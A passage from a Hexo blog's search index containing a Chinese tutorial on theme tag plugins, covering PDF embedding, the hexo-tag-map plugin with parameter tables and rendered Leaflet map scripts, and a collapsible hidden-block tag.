class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 1.本地文件:在md文件路径下创建一个同名文件夹，其内放pdf文件名为xxx.pdf的文件</span></span><br><span class="line">&#123;% pdf xxx.pdf %&#125;</span><br><span class="line"><span class="section"># 2.在线链接</span></span><br><span class="line">&#123;% pdf https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/pdf/小作文讲义.pdf %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>2.在线链接(要放到最外层才能起作用)</p><pre><code>&lt;div class=&quot;row&quot;&gt;&lt;embed src=&quot;https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/pdf/小作文讲义.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;&lt;/div&gt;</code></pre><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-30-Hexo-tag-map-插件">2.30 Hexo-tag-map 插件</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% + 标签值 + 经度 + 纬度 + 文本 + 缩放等级 + 宽 + 高 + 默认图层 + %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><table><thead><tr><th style="text-align:center">地图名</th><th style="text-align:center">标签值 &lt;必填&gt;</th><th style="text-align:center">宽 (默认 100%) / 高 (默认 360px)</th><th style="text-align:center">缩放等级 (默认 14)</th><th style="text-align:center">宽 (默认 100%) / 高 (默认 360px)</th><th style="text-align:center">默认图层 (默认 1)</th></tr></thead><tbody><tr><td style="text-align:center">混合地图</td><td style="text-align:center">map</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 3~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~7</td></tr><tr><td style="text-align:center">谷歌地图</td><td style="text-align:center">googleMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~20</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~3</td></tr><tr><td style="text-align:center">高德地图</td><td style="text-align:center">gaodeMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 3~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~3</td></tr><tr><td style="text-align:center">百度地图</td><td style="text-align:center">baiduMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 4~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~2</td></tr><tr><td style="text-align:center">Geoq 地图</td><td style="text-align:center">geoqMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~5</td></tr><tr><td style="text-align:center">openstreet 地图</td><td style="text-align:center">openstreetMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">不支持此参数</td></tr></tbody></table><ol><li>参数之间，用英文逗号相隔</li><li>参数必须按上述事例顺序输入，不得为空</li><li>同一个页面，同一组经纬度值，只能插入一个相同标签值的地图 (若有需要，可以将第二个地图上，经度或纬度末尾删除一两个数)</li><li>参数取值必须在上述范围内</li><li>默认图层：即地图叠加层的值，默认常规地图还是卫星地图，可按地图显示顺序取值</li><li>缩放等级，数字越大，地图比例尺越小，显示的越精细</li><li>除标签值外，其他参数选填，但 每个参数的左边的参数必填</li><li>谷歌地图需要外网才能加载查看</li></ol><p>坐标获取：<a href="https://lbs.amap.com/tools/picker">高德地图坐标拾取系统</a> 、<a href="https://api.map.baidu.com/lbsapi/getpoint/index.html">百度地图坐标拾取系统</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% map 120.101101,30.239119 %&#125;</span><br><span class="line">&#123;% googleMap 120.101101,30.239119, 这里是西湖灵隐寺，据说求姻缘很灵验哦！ %&#125;</span><br><span class="line">&#123;% geoqMap 120.101101,30.239119, 这里是西湖灵隐寺，据说求姻缘很灵验哦！, 13, 90%, 320px, 3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div class="map-box" style="margin: 0.8rem 0 1.6rem 0;"><div id="map-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div></div><script type="text/javascript">var normalm=L.tileLayer.chinaProvider('GaoDe.Normal.Map',{maxZoom:20,minZoom:1,attribution:'高德地图'});var imgm=L.tileLayer.chinaProvider('GaoDe.Satellite.Map',{maxZoom:20,minZoom:1,attribution:'高德地图'});var imga=L.tileLayer.chinaProvider('GaoDe.Satellite.Annotion',{maxZoom:20,minZoom:1,attribution:'高德地图'});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:20,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'});routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1,attribution:'Google Maps'});var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:21,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm]),image=L.layerGroup([imgm,imga]);var baseLayers={"高德地图":normal,"智图地图":normalm1,"谷歌地图":normalMap,"高德卫星地图":imgm,"谷歌卫星地图":satelliteMap,"高德卫星标注":image,"谷歌卫星标注":routeMap};var mymap=L.map('map-120.101101-30.239119',{center:[30.239119,120.101101],zoom:14,layers:[normal],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);</script><br><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="googleMap-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:22,minZoom:1,attribution:'Google Maps'});var baseLayers={"谷歌地图":normalMap,"谷歌卫星图":satelliteMap,"谷歌卫星标注": routeMap};var overlayLayers={};var mymap=L.map("googleMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:14,layers:[normalMap],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("这里是西湖灵隐寺，据说求姻缘很灵验哦！").openPopup();</script><br><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="geoqMap-120.101101-30.239119" style="max-width:90%; height:320px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm2=L.tileLayer.chinaProvider('Geoq.Normal.PurplishBlue',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm3=L.tileLayer.chinaProvider('Geoq.Normal.Gray',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm4=L.tileLayer.chinaProvider('Geoq.Normal.Warm',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm5=L.tileLayer.chinaProvider('Geoq.Theme.Hydro',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm1,normalm2,normalm3,normalm4,normalm5]);var baseLayers={"智图地图":normalm1,"午夜蓝":normalm2,"灰色":normalm3,"暖色":normalm4,"水系":normalm5};var mymap=L.map("geoqMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:13,layers:[normalm3],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("这里是西湖灵隐寺，据说求姻缘很灵验哦！").openPopup();</script><br><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-31-隐藏块">2.31 隐藏块</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock display,bg,color %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>content：要隐藏的内容</li><li>display：展示前按钮显示的文字（可选）</li><li>bg：按钮的背景颜色（可选）</li><li>color：按钮显示的文字的颜色（可选）</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock 点我预览, blue %&#125;</span><br><span class="line">这里有张图片：</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;image (1)&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:67%;&quot;</span> /&gt;</span></span></span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="hide-block"><button type="button" class="hide-button" style="background-color:  blue;">点我预览    </button><div class="hide-content"><p>这里有张图片：<br><img src="https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb" alt="image (1)" style="zoom:67%;" /></p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> 演示 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> 外挂标签 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
